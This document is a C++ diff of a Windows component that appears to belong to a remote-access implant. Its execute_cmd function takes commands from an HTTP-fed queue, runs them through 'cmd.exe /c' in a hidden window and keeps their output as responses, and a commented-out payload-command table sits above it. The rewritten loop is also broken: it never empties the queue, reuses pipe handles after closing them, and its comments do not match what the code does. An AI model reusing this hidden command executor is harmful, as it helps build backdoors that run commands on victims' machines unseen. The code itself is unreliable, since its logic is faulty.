@@ -3,6 +3,7 @@
 #include <string>
 #include <iostream>
 #include "xhttp.h"
+#include <map>
 
 /* PAYLOAD_COMMAND m_PayloadCommands[] = {
 
@@ -28,80 +29,97 @@ std::string command_dir() {
     }
 }
 
-// Does not support interactive usage
-bool execute_cmd(std::string& cmdString, std::string& current_dir, std::string& out_put, DWORD time_out) 
-{
-	current_dir = command_dir();
-	const int block_size = 512;
-	SECURITY_ATTRIBUTES sa;
-	sa.bInheritHandle = TRUE;
-	sa.lpSecurityDescriptor = NULL;
-	sa.nLength = sizeof(sa);
-	HANDLE read_hd = NULL;
-	HANDLE write_hd = NULL;
-	BOOL ret = CreatePipe(&read_hd, &write_hd, &sa, 64 * 0x1000);
-	out_put.clear();
+bool execute_cmd(xhttp::CommandQueue& queue, std::string& current_dir, DWORD time_out) {
+    current_dir = command_dir();
+    const int block_size = 512;
+    SECURITY_ATTRIBUTES sa;
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+    sa.nLength = sizeof(sa);
+    HANDLE read_hd = NULL;
+    HANDLE write_hd = NULL;
+    BOOL ret = CreatePipe(&read_hd, &write_hd, &sa, 64 * 0x1000);
 
-	if (!ret) {
-		return false;
-	}
+    if (!ret) {
+        return false;
+    }
 
-	STARTUPINFOA si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
-	GetStartupInfoA(&si);
-	si.cb = sizeof(si);
-	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-	si.wShowWindow = SW_HIDE;
-	si.hStdOutput = write_hd;
-	std::cout << "cmdString: " << cmdString << std::endl;
-	std::string cmd = "cmd.exe /c " + cmdString;
-	ret = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 0, NULL, current_dir.c_str(), &si, &pi);
-	CloseHandle(write_hd);
-	if (!ret) {
-		CloseHandle(read_hd);
-		return false;
-	}
-	if (WaitForSingleObject(pi.hProcess, time_out) == WAIT_TIMEOUT) {
-		TerminateProcess(pi.hProcess, 1);
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
-		CloseHandle(read_hd);
-		return false;
-	}
+    while (!queue.empty()) {
+        // Get an iterator to the first element
+        auto it = queue.begin();
+        // Access the command info
+        auto& cmdqueue = it->second; 
+        // Access cmdValue, cmdString, cmdResponse
+        std::string cmdGroup = cmdqueue.cmdGroup;
+        std::string cmdString = cmdqueue.cmdString;
+        std::string cmdResponse = cmdqueue.cmdResponse;
 
-	CloseHandle(pi.hThread);
-	CloseHandle(pi.hProcess);
+        cmdResponse.clear();
 
-	bool result = false;
-	char* buffer = new(std::nothrow) char[block_size];
-	if (buffer == nullptr) {
-		CloseHandle(read_hd);
-		return false;
-	}
-	while (1) {
-		DWORD read_len = 0;
-		if (ReadFile(read_hd, buffer, block_size, &read_len, NULL)) {
-			out_put.append(buffer, read_len);
-			if (block_size > read_len) {
-				result = true;
-				break;
-			}
-		}
-		else {
-			if (GetLastError() == ERROR_BROKEN_PIPE) {
-				result = true;
-				break;
-			}
-		}
-	}
-	
-	std::cout << "Dir: " << current_dir << std::endl;
-	std::cout << "Output: " << out_put << std::endl;
-	CloseHandle(read_hd);
-	delete[] buffer;
+        STARTUPINFOA si = { 0 };
+        PROCESS_INFORMATION pi = { 0 };
+        GetStartupInfoA(&si);
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+        si.wShowWindow = SW_HIDE;
+        si.hStdOutput = write_hd;
+        std::cout << "cmdString: " << cmdString << std::endl;
+        std::string cmd = "cmd.exe /c " + cmdString;
+        ret = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 0, NULL, current_dir.c_str(), &si, &pi);
+        CloseHandle(write_hd);
 
-	cmdString.clear();
-	return result;
+        if (!ret) {
+            CloseHandle(read_hd);
+            return false;
+        }
+
+        if (WaitForSingleObject(pi.hProcess, time_out) == WAIT_TIMEOUT) {
+            TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            CloseHandle(read_hd);
+            return false;
+        }
+
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+
+        bool result = false;
+        char* buffer = new(std::nothrow) char[block_size];
+
+        if (buffer == nullptr) {
+            CloseHandle(read_hd);
+            return false;
+        }
+
+        while (1) {
+            DWORD read_len = 0;
+            if (ReadFile(read_hd, buffer, block_size, &read_len, NULL)) {
+                cmdResponse.append(buffer, read_len);
+                if (block_size > read_len) {
+                    result = true;
+                    break;
+                }
+            }
+            else {
+                if (GetLastError() == ERROR_BROKEN_PIPE) {
+                    result = true;
+                    break;
+                }
+            }
+        }
+
+        std::cout << "Dir: " << current_dir << std::endl;
+        std::cout << "Output: " << cmdResponse << std::endl;
+		// Update CommandInfo structure with cmdResponse
+        cmdqueue.cmdResponse = cmdResponse;
+        CloseHandle(read_hd);
+        delete[] buffer;
+    }
+
+    // Clear cmdString after processing all commands in the queue
+    current_dir.clear();
+    return true;
 }
 
 }
